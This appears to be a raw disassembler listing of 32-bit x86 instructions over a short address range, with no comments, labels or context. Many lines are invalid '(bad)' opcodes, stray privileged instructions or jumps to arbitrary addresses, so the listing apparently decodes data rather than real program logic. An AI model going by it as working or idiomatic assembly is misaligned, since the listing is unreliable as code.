  4477a7:	sub    BYTE PTR [ebp+0xef4832d],dh
  4477ad:	jmp    0x447771
  4477af:	rcl    edx,1
  4477b1:	jecxz  0x4477b2
  4477b3:	outs   dx,BYTE PTR ds:[esi]
  4477b4:	daa    
  4477b5:	sub    ebx,DWORD PTR [edx]
  4477b7:	sub    BYTE PTR [ebp+0xf34832d],dh
  4477bd:	in     eax,0xc2
  4477bf:	nop
  4477c0:	mov    BYTE PTR [ecx],ah
  4477c2:	xor    edx,DWORD PTR [eax+0x1e]
  4477c5:	psubsb mm3,QWORD PTR [ebp+0xb]
  4477c9:	or     eax,0x2188d300
  4477ce:	add    dh,BYTE PTR [eax+0x5582e876]
  4477d4:	call   0xc7583ae6
  4477d9:	repz cld 
  4477db:	shl    bl,cl
  4477dd:	mov    esi,ebp
  4477df:	(bad)  
  4477e0:	fcom   QWORD PTR [ecx+0x380ba675]
  4477e6:	(bad)  
  4477e7:	scas   eax,DWORD PTR es:[edi]
  4477e8:	inc    ebp
  4477e9:	mov    al,ds:0xb548aff7
  4477ee:	es nop
  4477f0:	or     ecx,DWORD PTR ds:0xe3c713c3
  4477f6:	aas    
  4477f7:	sbb    eax,0xb33d9206
  4477fc:	push   cs
  4477fd:	rol    BYTE PTR [ebx+0x6ced0a05],cl
  447803:	add    BYTE PTR [eax],al
  447805:	add    BYTE PTR [eax],al
  447807:	add    BYTE PTR [ebp-0x72dcd778],dl
  44780d:	dec    eax
  44780e:	xchg   edx,eax
  44780f:	cmp    eax,0x80d208b3
  447814:	in     eax,0xb
  447816:	or     al,0x6d
  447818:	xchg   esi,eax
  447819:	xor    eax,DWORD PTR [ebp+esi*8-0x172d73a9]
  447820:	xchg   ecx,eax
  447821:	or     ecx,DWORD PTR ds:0xa6235300
  447827:	idiv   DWORD PTR [edi]
  447829:	rol    BYTE PTR fs:[ebx+0x6d4cf8b5],cl
  447830:	xchg   esi,eax
  447831:	arpl   WORD PTR [esi-0x2d43d809],si
  447837:	call   0xf7eb3ed7
  44783c:	adc    esi,DWORD PTR [edx-0xe6f1b46]
  447842:	jae    0x44787a
  447844:	xchg   edx,eax
  447845:	rol    BYTE PTR [ebx+0x1a88e80d],cl
  44784b:	mov    eax,0xe4ba30ff
  447850:	jmp    0x447841
  447852:	(bad)  
  447853:	and    ebp,ebx
  447855:	hlt    
  447856:	fild   WORD PTR [ebx-0x3b0a2e63]
  44785c:	call   0xc7fc6b94
  447861:	or     ebp,esi
  447863:	mov    eax,0x3973f4bf
  447868:	mov    ?,WORD PTR [edx+0xb42]
  44786e:	add    BYTE PTR [eax],al
  447870:	add    BYTE PTR [ebx],cl
  447872:	outs   dx,DWORD PTR ds:[esi]
  447873:	in     eax,dx
  447874:	add    al,0x6d
  447876:	shl    DWORD PTR [ecx+eax*2+0x73],1
  44787a:	mov    cl,0xb4
  44787c:	and    DWORD PTR ds:0x9630f69c,0xc
  447883:	pop    ebx
  447884:	mov    bh,0x87
  447886:	hlt    
  447887:	mov    bl,0x8b
  447889:	lds    ebx,FWORD PTR [eax+0x2fb340f6]
  44788f:	xor    ah,bl
  447891:	xchg   ecx,eax
  447892:	out    dx,eax
  447893:	jae    0x4478ce
  447895:	xchg   edx,eax
  447896:	shr    bl,cl
  447898:	icebp  
  447899:	outs   dx,DWORD PTR ds:[esi]
  44789a:	sub    eax,0xb67b763
  44789f:	lods   eax,DWORD PTR ds:[esi]
  4478a0:	mov    eax,0x3973f45f
  4478a5:	sahf   
  4478a6:	mov    dl,0xc2
  4478a8:	or     bl,BYTE PTR [ebx]
  4478aa:	outs   dx,BYTE PTR ds:[esi]
  4478ab:	fld    QWORD PTR [edi*2+0x734174cf]
  4478b2:	lods   al,BYTE PTR ds:[esi]
  4478b3:	xor    al,0x83
  4478b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4478b6:	pushf  
  4478b7:	div    BYTE PTR [eax]
  4478b9:	es or  al,0xe
  4478bc:	(bad)
  4478bf:	call   0x4fa83ee
  4478c4:	call   0xa4d24819
  4478c9:	repnz mov cl,0xcd
  4478cc:	add    DWORD PTR [eax-0x2],esp
  4478cf:	call   0xea5f9ce2
  4478d4:	push   es
  4478d5:	add    BYTE PTR [eax],al
  4478d7:	add    BYTE PTR [eax],al
  4478d9:	add    BYTE PTR [edi],ah
  4478db:	xor    BYTE PTR [ebx-0x29],ch
  4478de:	xchg   ebx,eax
  4478df:	test   DWORD PTR ds:0xf985162,edx
  4478e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4478e6:	repnz xor BYTE PTR [ebx+0xa],dl
  4478ea:	nop
  4478eb:	out    dx,eax
  4478ec:	mov    WORD PTR [esi+edx*4-0x4f],ds
  4478f0:	arpl   di,bp
  4478f2:	jmp    0x4478ac
  4478f4:	jmp    0x953477c7
  4478f9:	sub    al,0x8a
  4478fb:	mov    cl,0x53
  4478fd:	or     dl,BYTE PTR [ebx]
  4478ff:	mov    dh,0x2d
  447901:	jmp    0x4478d5
  447903:	or     ch,BYTE PTR [ebp*4+0xff5fbde]
  44790a:	dec    eax
  44790b:	sti    
  44790c:	call   0xfe9417b
  447911:	pop    ss
  447912:	jle    0x44791f
  447914:	pop    es
  447915:	mov    ?,WORD PTR [esi]
  447917:	sti    
  447918:	int3   
  447919:	jb     0x4478eb
  44791b:	cwde   
  44791c:	(bad)  
  44791e:	jae    0x447950
  447920:	push   ebx
  447921:	retf   0xef91
  447924:	cmc    
  447925:	and    ebx,DWORD PTR [eax]
  447927:	sti    
  447928:	call   0x10e90197
  44792d:	fild   WORD PTR [ebp+0xb]
  447930:	jmp    0x447989
  447932:	push   es
  447933:	sti    
  447934:	int3   
  447935:	inc    ecx
  447936:	add    esi,edi
  447938:	call   0x2b6d4f3d
  44793d:	sbb    al,BYTE PTR [eax]
  44793f:	add    BYTE PTR [eax],al
  447941:	add    BYTE PTR [eax],al
  447943:	cmp    BYTE PTR [edx+0x2d],dh
  447946:	sub    esp,0xf
  447949:	(bad)  
  44794b:	ror    DWORD PTR [edi-0x1b],1
  44794e:	push   DWORD PTR [esi-0x5903f5b9]
  447954:	cmp    al,0x8d
  447956:	jge    0x447957
  447958:	mov    cl,0x60
  44795a:	push   es
  44795b:	xchg   ecx,eax
  44795c:	in     al,0xdf
  44795e:	call   DWORD PTR [esi-0xcba6b10]
  447964:	lods   eax,DWORD PTR ds:[esi]
  447965:	sub    esp,DWORD PTR [ebx]
  447967:	push   0x72
  447969:	sub    eax,0xa147aa02
  44796e:	sti    
  44796f:	mov    dh,0x3c
  447971:	test   BYTE PTR [ebx],0xe5
  447974:	cmp    al,0xe1
  447976:	and    DWORD PTR [esp+eiz*4+0xe],0x75
  44797b:	ret    
  44797c:	xor    DWORD PTR [ebx+0xa],esp
  44797f:	mov    edx,0xb9ac6bad
  447984:	scas   al,BYTE PTR es:[edi]
  447985:	push   cs
  447986:	and    DWORD PTR [esp+ebp*4-0x16],0xe
  44798b:	aaa    
  44798c:	nop
  44798d:	push   cs
  44798e:	add    BYTE PTR [ecx+0x1e],bh
  447991:	lods   al,BYTE PTR ds:[esi]
  447992:	(bad)  
  447993:	es sub ch,cl
  447996:	and    DWORD PTR [eax+eax*8+0x3383750f],0x63
  44799e:	or     bh,BYTE PTR [edx-0x49]
  4479a1:	imul   ecx,DWORD PTR [ecx+edi*2+0x830eb6],0x0
  4479a9:	add    BYTE PTR [eax],al
  4479ab:	add    BYTE PTR [eax+edi*4+0xf],ah
  4479af:	movzx  esi,WORD PTR [esi+ecx*1]
  4479b3:	add    BYTE PTR [ecx],bh
  4479b5:	push   ds
  4479b6:	mov    esi,?
  4479b8:	out    0x27,al
  4479ba:	int    0x83
  4479bc:	nop
  4479bd:	push   es
  4479be:	sbb    eax,DWORD PTR [edx]
  4479c0:	mov    ebp,0x9a758deb
  4479c5:	fcom   QWORD PTR [ecx]
  4479c7:	jge    0x44797d
  4479c9:	fisttp DWORD PTR [eax+eax*1]
  4479cc:	sub    al,bh
  4479ce:	mov    ds:0x8f9d17f7,al
  4479d3:	jne    0x44797b
  4479d5:	fdiv   QWORD PTR [edi]
  4479d7:	add    al,0x13
  4479d9:	dec    edi
  4479da:	pop    ss
  4479db:	add    eax,DWORD PTR [ebp-0x9a54adb]
  4479e1:	shl    BYTE PTR [ebx+0x1b3713c3],0xfc
  4479e8:	pop    esp
  4479e9:	fisttp WORD PTR [ebp+0x37dc8a75]
  4479ef:	dec    eax
  4479f0:	call   0xd03c1d08
  4479f5:	sbb    al,0x8e
  4479f7:	jne    0x447997
  4479f9:	(bad)  
  4479fa:	aaa    
  4479fb:	(bad)  
  4479fc:	mov    bh,0xc7
  4479fe:	mov    al,ds:0x8e1cb7f7
  447a03:	jne    0x44798b
  447a05:	loope  0x447a3e
  447a07:	add    al,0x13
  447a09:	scas   eax,DWORD PTR es:[edi]
  447a0a:	adc    al,0x3
  447a0c:	and    eax,0x2abab5
  447a11:	add    BYTE PTR [eax],al
  447a13:	add    BYTE PTR [eax],al
  447a15:	xchg   esi,eax
  447a16:	and    BYTE PTR [edx+0x189613c3],ah
  447a1c:	(bad)  
  447a1d:	cld    
  447a1e:	icebp  
  447a1f:	lea    esi,[ebp-0x76]
  447a22:	fdiv   QWORD PTR [edi]
  447a24:	sbb    BYTE PTR [ebx],dl
  447a26:	mov    esi,0xe7e53fdf
  447a2b:	lea    esi,[ebp-0x6a]
  447a2e:	fstp   TBYTE PTR [eax]
  447a30:	add    al,0x68
  447a32:	xlat   BYTE PTR ds:[ebx]
  447a33:	mov    ds:0xb51c57f7,al
  447a38:	dec    BYTE PTR [ebp-0x4e]
  447a3b:	jo     0x4479f1
  447a3d:	push   ebx
  447a3e:	cmp    eax,0x779119b2
  447a43:	adc    al,0x81
  447a45:	jne    0x4479dc
  447a47:	cmc    
  447a48:	sar    BYTE PTR [eax],0xe0
  447a4b:	dec    esp
  447a4c:	mov    ah,0x1f
  447a4e:	(bad)  
  447a50:	mov    eax,0x3673f127
  447a55:	xchg   BYTE PTR [esi-0x29080246],dh
  447a5b:	xor    DWORD PTR [edi+edi*8-0x65c1a40c],esi
  447a62:	mov    bl,0xba
  447a64:	loopne 0x447a78
  447a66:	ja     0x447a3c
  447a68:	add    bl,dl
  447a6a:	fldenv [ecx]
  447a6c:	mov    ecx,0x11fef0df
  447a71:	fcomi  st,st(0)
  447a73:	fistp  QWORD PTR [edi+0x5d]
  447a76:	enter  0x2ef7,0x0
  447a7a:	add    BYTE PTR [eax],al
  447a7c:	add    BYTE PTR [eax],al
  447a7e:	into   
  447a7f:	fdivr  DWORD PTR [edx-0x4c0f404f]
  447a85:	xchg   DWORD PTR [ebp-0x38],eax
  447a88:	cmc    
  447a89:	cmp    BYTE PTR [esi-0x584e8128],dh
  447a8f:	lock mov bl,0x87
  447a92:	sbb    eax,0x9e38f4c8
  447a97:	fcom   DWORD PTR [edx-0x4c0f604f]
  447a9d:	xchg   DWORD PTR ds:0x8638fbc9,eax
  447aa3:	fcom   DWORD PTR [esi-0x4f]
  447aa6:	xchg   eax,esi
  447aa8:	mov    bl,0x87
  447aaa:	std    
  447aab:	enter  0x38f2,0x6e
  447aaf:	fmul   DWORD PTR [edx-0x4f]
  447ab2:	pop    edi
  447ab3:	lock mov bl,0x87
  447ab6:	in     eax,0xc8
  447ab8:	push   cs
  447ab9:	out    dx,al
  447aba:	mov    eax,ds:0x161f0f0
  447abf:	call   0xae0ba5ac
  447ac4:	add    al,0xe8
  447ac6:	enter  0x8d93,0xac
  447aca:	cs mov dl,0xcd
  447acd:	inc    ecx
  447ace:	mov    ebp,0xf46e8ec
  447ad3:	data16 add cl,ch
  447ad6:	pop    eax
  447ad7:	(bad)
  447adc:	call   0xaa920b
  447ae1:	call   0x447ae6
  447ae6:	add    al,cl
  447ae8:	lock lock mov DWORD PTR [eax-0x18],eax
  447aed:	call   0xaa8a1c
  447af2:	jmp    0x447a9c
  447af4:	shl    esi,0xb4
  447af7:	xor    eax,0xa16ae8e8
  447afc:	mov    esp,0xda3d7d0d
  447b01:	push   esi
  447b02:	in     al,dx
  447b03:	add    ch,al
  447b05:	int3   
  447b06:	push   0xffffff80
  447b08:	ror    BYTE PTR ds:0x2ada8a54,0xd4
  447b0f:	add    ch,al
  447b11:	int3   
  447b12:	push   0x60
  447b14:	rcl    BYTE PTR [edx],0x3c
  447b17:	jge    0x447af3
  447b19:	xor    eax,ebx
  447b1b:	loop   0x447b04
  447b1d:	mov    WORD PTR [esi+edx*4],?
  447b20:	mov    ah,0x62
  447b22:	(bad)  
  447b23:	sub    edx,eax
  447b25:	jmp    0x447acd
  447b27:	inc    edx
  447b28:	repz mov WORD PTR [edx+ebx*4],ds
  447b2c:	in     eax,dx
  447b2d:	popa   
  447b2e:	out    dx,eax
  447b2f:	sbb    ecx,esp
  447b31:	jmp    0x447ac1
  447b33:	and    dh,bl
  447b35:	mov    WORD PTR [eax],es
  447b37:	mov    esp,cs
  447b39:	call   0xe98fb3b2
  447b3e:	stc    
  447b3f:	fisub  WORD PTR [ecx*4+0x7ab8337d]
  447b46:	or     al,0xe1
  447b48:	mov    eax,0xffe3
  447b4d:	add    BYTE PTR [eax],al
  447b4f:	add    dh,bl
  447b51:	clc    
  447b52:	cmc    
  447b53:	std    
  447b54:	frstor [ecx+eiz*8]
  447b57:	ret    
  447b58:	mov    dl,0x7a
  447b5a:	add    al,0x1
  447b5c:	hlt    
  447b5d:	xlat   BYTE PTR ds:[ebx]
  447b5e:	mov    eax,DWORD PTR [ebp-0x76]
  447b61:	mov    bh,0xcd
  447b63:	call   0x259bf7
  447b68:	jp     0x447b0c
  447b6a:	sbb    BYTE PTR [eax],al
  447b6c:	and    al,0xb9
  447b6e:	mul    cl
  447b70:	popf   
  447b71:	and    al,0xe1
  447b73:	ret    
  447b74:	push   0xffffffa2
  447b76:	sbb    BYTE PTR [ecx],al
  447b78:	add    al,0xb9
  447b7a:	not    ch
  447b7c:	lea    esp,[ecx+eiz*8]
  447b7f:	ret    
  447b80:	push   0xffffffa2
  447b82:	sbb    BYTE PTR [edx],al
  447b84:	push   esp
  447b85:	(bad)  
  447b86:	test   dl,0xc0
  447b89:	and    cl,ah
  447b8b:	sub    DWORD PTR [eax+esi*8],0xb
  447b8f:	je     0x447c0c
  447b91:	dec    esi
  447b92:	mov    al,ds:0xcd20defc
  447b97:	sbb    DWORD PTR [esp+ecx*8+0xd],0x75
  447b9c:	mov    bh,0x4a
  447b9e:	pushf  
  447b9f:	cld    
  447ba0:	fisub  WORD PTR [eax]
  447ba2:	int    0x83
  447ba4:	pop    esp
  447ba5:	int3   
  447ba6:	jmp    0x2ef9:0x814a6874
  447bad:	and    al,0x8d
  447baf:	jge    0x447b34
  447bb1:	mov    bh,0x7a
  447bb3:	das    
  447bb4:	add    BYTE PTR [eax],al
  447bb6:	add    BYTE PTR [eax],al
  447bb8:	add    BYTE PTR [eax+0x6ff49b33],dl
  447bbe:	cmp    eax,0xde583d3
  447bc3:	adc    BYTE PTR [ebp-0x6a],ch
  447bc6:	inc    ebx
  447bc7:	(bad)  
  447bc8:	hlt    
  447bc9:	push   edi
  447bca:	rol    DWORD PTR gs:[ebx+0x6d1705cd],cl
  447bd1:	mov    eax,ds:0x3ff91e83
  447bd6:	lea    edx,[ebx+0x20d88a75]
  447bdc:	add    al,0x38
  447bde:	add    al,0xb9
  447be0:	mul    DWORD PTR [edi]
  447be2:	cdq    
  447be3:	mov    dh,BYTE PTR [edx+0x1c]
  447be6:	lods   eax,DWORD PTR ds:[esi]
  447be7:	lahf   
  447be8:	ret    
  447be9:	or     ebx,DWORD PTR [edi]
  447beb:	sbb    eax,DWORD PTR [ecx]
  447bed:	push   ebp
  447bee:	mov    eax,0xd8b33d93
  447bf3:	shr    eax,1
  447bf5:	xor    edx,DWORD PTR [ebx+0x4713f79f]
  447bfb:	pop    es
  447bfc:	add    BYTE PTR [ebp-0x2b],ah
  447bff:	test   BYTE PTR [esi-0x1c],cl
  447c02:	mov    ah,0x9f
  447c04:	ret    
  447c05:	adc    ebp,DWORD PTR [edi+0x7]
  447c08:	add    DWORD PTR [ebp-0x23],ebx
  447c0b:	test   BYTE PTR [edx-0x34],cl
  447c0e:	fcomp  QWORD PTR [ebp+0x45713c3]
  447c14:	add    al,BYTE PTR [ebp-0x1a]
  447c17:	test   BYTE PTR [edi],ch
  447c19:	mov    ecx,0x839e04
  447c1e:	add    BYTE PTR [eax],al
  447c20:	add    BYTE PTR [eax],al
  447c22:	sub    eax,0xc0711d1
  447c27:	jno    0x447c3b
  447c29:	add    BYTE PTR [eax-0x680c11fd],dl
  447c2f:	and    al,0xd2
  447c31:	or     DWORD PTR ds:0xa56d1206,0xffffffb2
  447c38:	je     0x447c68
  447c3a:	xchg   edx,eax
  447c3b:	ret    0x1302
  447c3e:	push   0x67b07ec4
  447c43:	xor    DWORD PTR [edx],ebx
  447c45:	(bad)  
  447c46:	xchg   edx,eax
  447c47:	xor    WORD PTR [edx+eax*4+0x53b067ee],bx
  447c4f:	(bad)  
  447c51:	scas   eax,DWORD PTR es:[edi]
  447c52:	inc    edi
  447c53:	in     eax,dx
  447c54:	mov    bl,0x84
  447c56:	mov    ebp,0x3e36fbc4
  447c5b:	aad    0xf6
  447c5d:	scas   eax,DWORD PTR es:[edi]
  447c5e:	aas    
  447c5f:	in     eax,dx
  447c60:	xor    eax,DWORD PTR [ebp+eiz*4+0x2636f2c4]
  447c67:	aad    0x2a
  447c69:	lods   al,BYTE PTR ds:[esi]
  447c6a:	daa    
  447c6b:	in     eax,dx
  447c6c:	xor    eax,DWORD PTR [ebp+ebx*4-0x5ec9063c]
  447c73:	ficom  DWORD PTR [ebp-0x55]
  447c76:	(bad)  
  447c77:	in     al,dx
  447c78:	jae    0x447ca8
  447c7a:	mov    dh,BYTE PTR [ecx+0xeefda83]
  447c80:	cld    
  447c81:	scas   eax,DWORD PTR es:[edi]
  447c82:	out    0xf0,eax
  447c84:	jae    0x447cb4
  447c86:	add    BYTE PTR [eax],al
  447c88:	add    BYTE PTR [eax],al
  447c8a:	add    BYTE PTR [esi+0x13186ab5],dl
  447c90:	outs   dx,DWORD PTR ds:[esi]
  447c91:	cmc    
  447c92:	adc    esp,DWORD PTR [ebp-0x3d]
  447c95:	cmpxchg8b (bad)
  447c96:	(bad)  
  447c97:	enter  0xf7ec,0x83
  447c9b:	cmp    eax,0x9437f4b8
  447ca0:	fidiv  DWORD PTR [esi-0x4c134055]
  447ca6:	pushf  
  447ca7:	jmp    0x3a38:0xd3afd7e8
  447cae:	or     dl,BYTE PTR [ecx+0x55831477]
  447cb4:	xchg   ecx,eax
  447cb5:	push   cs
  447cb6:	jmp    0xe437:0xb1f4db52
  447cbd:	mov    WORD PTR [esi+eiz*4],fs
  447cc0:	mov    dl,0x63
  447cc2:	hlt    
  447cc3:	sbb    edi,DWORD PTR [esi+eiz*8]
  447cc6:	xchg   esi,eax
  447cc7:	aas    
  447cc8:	xor    BYTE PTR [ebx-0x1d],ch
  447ccb:	xchg   edx,eax
  447ccc:	mov    bl,0x93
  447cce:	dec    ecx
  447ccf:	xchg   esp,eax
  447cd0:	mov    dl,0xe
  447cd2:	xchg   ecx,eax
  447cd3:	xlat   BYTE PTR ds:[ebx]
  447cd4:	out    0xe8,eax
  447cd6:	jbe    0x447d2b
  447cd8:	xor    BYTE PTR [ebx-0x29],ch
  447cdb:	mov    WORD PTR [ebp+0x3],ds
  447cde:	push   ecx
  447cdf:	sub    dl,0xe8
  447ce2:	pop    esi
  447ce3:	adc    esp,DWORD PTR [esi+0x14]
  447ce6:	jmp    0xb293:0xe9936f2e
  447ced:	idiv   BYTE PTR [ebp+0x0]
  447cf3:	add    dl,ch
  447cf5:	jecxz  0x447cdf
  447cf7:	sub    dl,BYTE PTR [ebx]
  447cf9:	data16 add bl,ch
  447cfc:	enter  0xf6bd,0xc8
  447d00:	cmp    esp,esp
  447d02:	call   0xdfd3e71
  447d07:	out    dx,al
  447d08:	or     BYTE PTR [ecx+0xe],bl
  447d0b:	jmp    0x128b57a3
  447d10:	aaa    
  447d11:	in     al,0xcc
  447d13:	push   0xffffffa1
  447d15:	mov    esp,0xda7c740d
  447d1a:	dec    edi
  447d1b:	icebp  
  447d1c:	(bad)  
  447d1d:	jecxz  0x447cab
  447d1f:	ins    BYTE PTR es:[edi],dx
  447d20:	leave  
  447d21:	mov    al,0x63
  447d23:	cmp    bl,BYTE PTR [ecx+esi*2]
  447d26:	in     eax,0xde
  447d28:	out    0xef,al
  447d2a:	mov    WORD PTR [esi+eax*4-0x12],ss
  447d2e:	popa   
  447d2f:	out    0xb,eax
  447d31:	popf   
  447d32:	in     eax,0x0
  447d34:	(bad)  
  447d35:	sbb    al,0xcd
  447d37:	adc    DWORD PTR [esp+eax*8-0x15],0x74
  447d3c:	push   0x36f82d47
  447d41:	sbb    al,0x8d
  447d43:	jge    0x447cc8
  447d45:	mov    al,0x7b
  447d47:	xor    BYTE PTR [ecx],ah
  447d49:	mov    esp,0xf006ffe5
  447d4e:	mov    WORD PTR [ebp+0x5f],?
  447d51:	mov    ch,0x7b
  447d53:	adc    DWORD PTR [ecx],eax
  447d55:	jmp    0x447d37
  447d57:	inc    DWORD PTR [eax]
  447d59:	add    BYTE PTR [eax],al
  447d5b:	add    BYTE PTR [eax],al
  447d5d:	(bad)  
  447d5e:	xor    BYTE PTR [ebx+0xa],ah
  447d61:	cmp    ch,BYTE PTR [edx+0x1831e807]
  447d67:	loope  0x447d68
  447d69:	push   0x30
  447d6b:	arpl   WORD PTR [esi],dx
  447d6d:	cs pushf 
  447d6f:	jmp    0xe1694a5b
  447d74:	call   edx
  447d76:	mov    ch,0xf6
  447d78:	cmc    
  447d79:	rcr    DWORD PTR [ecx+eiz*8],cl
  447d7c:	ret    
  447d7d:	mov    ds:0x3c01047a,al
  447d82:	ror    BYTE PTR [ebx-0x324f65bb],1
  447d88:	call   0x25945c
  447d8d:	push   0xffffffa2
  447d8f:	sbb    BYTE PTR [eax],al
  447d91:	or     al,0xc6
  447d93:	not    dl
  447d95:	jle    0x447db3
  447d97:	loope  0x447d1c
  447d99:	adc    al,0xe9
  447d9b:	or     esi,DWORD PTR [ebp-0x8]
  447d9e:	inc    esi
  447d9f:	sar    dl,1
  447da1:	(bad)  
  447da2:	sbb    al,0xcd
  447da4:	xor    DWORD PTR [eax*8+0x46b8750f],0xffffffa5
  447dac:	not    esi
  447dae:	sbb    al,0x8d
  447db0:	jge    0x447d42
  447db2:	iret   
  447db3:	or     eax,0x62f16a6d
  447db8:	cli    
  447db9:	lahf   
  447dba:	repz into 
  447dbc:	adc    DWORD PTR ds:0x6d0f03,0x0
  447dc3:	add    BYTE PTR [eax],al
  447dc5:	add    BYTE PTR [ecx-0x78108a0d],ah
  447dcb:	sbb    DWORD PTR [edi+0x1fdc8a75],ecx
  447dd1:	and    ebp,DWORD PTR [eax+0x7c]
  447dd4:	mov    ah,0xf7
  447dd6:	outs   dx,DWORD PTR ds:[esi]
  447dd7:	sbb    eax,0xdc7e758f
  447ddc:	pop    ds
  447ddd:	adc    DWORD PTR [eax+0x5f],ebp
  447de0:	mov    ds:0x395d57f7,eax
  447de5:	or     dl,BYTE PTR [ebx+0x19e7e8e6]
  447deb:	mov    bx,0x53f7
  447def:	test   BYTE PTR [edi-0x3076c806],cl
  447df5:	mov    edx,ebp
  447df7:	in     eax,0xb
  447df9:	cmp    eax,0x23515c73
  447dfe:	xchg   edx,eax
  447dff:	pushf  
  447e00:	mov    ebx,0x5190733d
  447e05:	add    ah,BYTE PTR [eax+0x6000cdb]
  447e0b:	pxor   mm7,QWORD PTR [edi+0x7d]
  447e0f:	std    
  447e10:	jmp    0x5c080c81
  447e15:	cli    
  447e16:	out    dx,eax
  447e17:	ror    bh,0x8b
  447e1a:	dec    ebp
  447e1b:	cld    
  447e1c:	jmp    0x16a306ce
  447e21:	xchg   BYTE PTR [ebx-0x6b3f7225],dl
  447e27:	loopne 0x447de5
  447e29:	mov    edi,0x0
  447e2e:	add    BYTE PTR [ebp-0x23],cl
  447e31:	in     al,dx
  447e32:	(bad)  
  447e33:	mov    edi,0xbfc0f7b2
  447e38:	outs   dx,DWORD PTR ds:[esi]
  447e39:	adc    al,0xae
  447e3b:	ins    DWORD PTR es:[edi],dx
  447e3c:	xchg   esp,eax
  447e3d:	ja     0x447e6d
  447e3f:	jb     0x447dfa
  447e41:	inc    edx
  447e42:	push   es
  447e43:	test   al,0x9f
  447e45:	int    0xac
  447e47:	lahf   
  447e48:	cmc    
  447e49:	pop    ebx
  447e4a:	mov    es,WORD PTR ds:[edx]
  447e4d:	into   
  447e4e:	jp     0x447e2d
  447e50:	mov    al,0x6c
  447e52:	inc    esi
  447e53:	mov    bl,0xb9
  447e55:	dec    ecx
  447e56:	sti    
  447e57:	or     al,0xae
  447e59:	jns    0x447e5b
  447e5b:	nop
  447e5c:	xor    eax,0x25f07b7
  447e61:	ins    BYTE PTR es:[edi],dx
  447e62:	dec    esi
  447e63:	pop    esi
  447e64:	add    dl,BYTE PTR [esi-0x4b4f3286]
  447e6a:	lods   al,BYTE PTR ds:[esi]
  447e6b:	lea    edx,[ebp+0x32724661]
  447e71:	cli    
  447e72:	loope  0x447e0a
  447e74:	pop    edi
  447e75:	stc    
  447e76:	fwait
  447e77:	xchg   edx,eax
  447e78:	in     al,dx
  447e79:	inc    edi
  447e7a:	lods   al,BYTE PTR ds:[esi]
  447e7b:	push   ebx
  447e7c:	cmp    eax,0x208ee0ba
  447e81:	imul   edi
  447e83:	sti    
  447e84:	pop    ebp
  447e85:	(bad)
  447e88:	pop    ebp
  447e89:	stc    
  447e8a:	out    dx,eax
  447e8b:	xor    eax,0x2eefed5e
  447e90:	pop    esi
  447e91:	icebp  
  447e92:	out    dx,eax
  447e93:	add    BYTE PTR [eax],al
  447e95:	add    BYTE PTR [eax],al
  447e97:	add    BYTE PTR [esi-0xb670aa2],dl
  447e9d:	out    dx,al
  447e9e:	mov    cl,0x3
  447ea0:	xchg   ecx,eax
  447ea1:	cmp    eax,0x208ee0ba
  447ea6:	out    dx,eax
  447ea7:	jle    0x447e85
  447ea9:	ss hlt 
  447eab:	add    edx,DWORD PTR [ebx]
  447ead:	repnz repnz lods al,BYTE PTR ds:[esi]
  447eb0:	loopne 0x447ea1
  447eb2:	or     eax,0xcdb293ac
  447eb7:	out    dx,al
  447eb8:	push   ebp
  447eb9:	xchg   ebp,eax
  447eba:	call   0x6bad2ceb
  447ebf:	or     ebp,DWORD PTR [ebx+0x37c11055]
  447ec5:	jmp    0x447eaf
  447ec7:	into   
  447ec8:	xlat   BYTE PTR ds:[ebx]
  447ec9:	cmp    al,0x53
  447ecb:	or     bl,BYTE PTR [ebx+0x23fd0e16]
  447ed1:	push   edi
  447ed2:	sub    ch,dh
  447ed4:	out    0x56,eax
  447ed6:	and    al,0xed
  447ed8:	lock push esi
  447eda:	and    ch,ah
  447edc:	icebp  
  447edd:	push   esi
  447ede:	sbb    al,0xdd
  447ee0:	repnz push esi
  447ee2:	cmp    ch,dl
  447ee4:	lds    edx,FWORD PTR [esi+0x34]
  447ee7:	int    0xbe
  447ee9:	push   esi
  447eea:	xor    ch,al
  447eec:	mov    edi,0xe8bd2c56
  447ef1:	push   esi
  447ef2:	or     BYTE PTR [ebp-0x52fba917],dh
  447ef8:	ficom  DWORD PTR [esi+0x0]
  447efb:	and    eax,0x0
  447f00:	add    BYTE PTR [eax-0x76e303aa],bl
  447f06:	push   esi
  447f07:	sbb    BYTE PTR ds:0xd14568a,dl
  447f0d:	jnp    0x447f65
  447f0f:	adc    BYTE PTR ds:0x520c5c1b,al
  447f15:	nop
  447f16:	sub    BYTE PTR [ebx-0x18],dl
  447f19:	mov    WORD PTR [ebx],?
  447f1b:	push   ebx
  447f1c:	or     bh,bl
  447f1e:	adc    eax,0x30907416
  447f23:	or     eax,0x11f316e9
  447f28:	push   ss
  447f29:	mov    esp,0x93e85328
  447f2e:	repz call 0xe315a334
  447f34:	inc    ebp
  447f35:	(bad)  [ebx]
  447f37:	arpl   WORD PTR [edx],sp
  447f39:	scas   al,BYTE PTR es:[edi]
  447f3a:	mov    ds:0x16f1e7e8,al
  447f3f:	loope  0x447f40
  447f41:	jmp    0x1661:0xbe232b68
  447f48:	lea    esi,ds:0xa9040e69
  447f4e:	mov    bl,0xd
  447f50:	add    BYTE PTR [edx],ch
  447f52:	repz jmp 0xe134a956
  447f58:	inc    ebp
  447f59:	call   0x2c9a:0xe9222b1c
  447f60:	sete   BYTE PTR [esi+esi*8+0x21]
  447f68:	add    BYTE PTR [eax],al
  447f6a:	xor    BYTE PTR [ecx+eiz*8],bl
  447f6d:	ret    
  447f6e:	bnd jb 0x447f9e
  447f71:	(bad)  
  447f73:	jmp    0x447f06
  447f75:	test   bh,bl
  447f77:	mov    bl,0x16
  447f79:	add    BYTE PTR [ecx],bh
  447f7b:	mov    al,0xe
  447f7d:	cmp    ecx,0xffffffe6
  447f80:	(bad)  
  447f82:	jmp    0x2c72:0xaf232b1b
  447f89:	or     BYTE PTR [ebp+ecx*8+0xf],0x75
  447f8e:	aaa    
  447f8f:	dec    ebx
  447f90:	in     al,0xf8
  447f92:	into   
  447f93:	sbb    al,0xcd
  447f95:	mov    esp,esp
  447f97:	iret   
  447f98:	movzx  eax,BYTE PTR [ecx]
  447f9b:	push   0x6a
  447f9d:	mov    ?,ecx
  447f9f:	fsubp  st(0),st
  447fa1:	(bad)  
  447fa2:	jmp    0xbe1b:0xe5c08db2
  447fa9:	ret    
  447faa:	mov    dh,0x72
  447fac:	add    al,0x0
  447fae:	nop
  447faf:	(bad)  [eax+eax*1]
  447fb2:	or     ecx,DWORD PTR [esi]
  447fb4:	lock push es
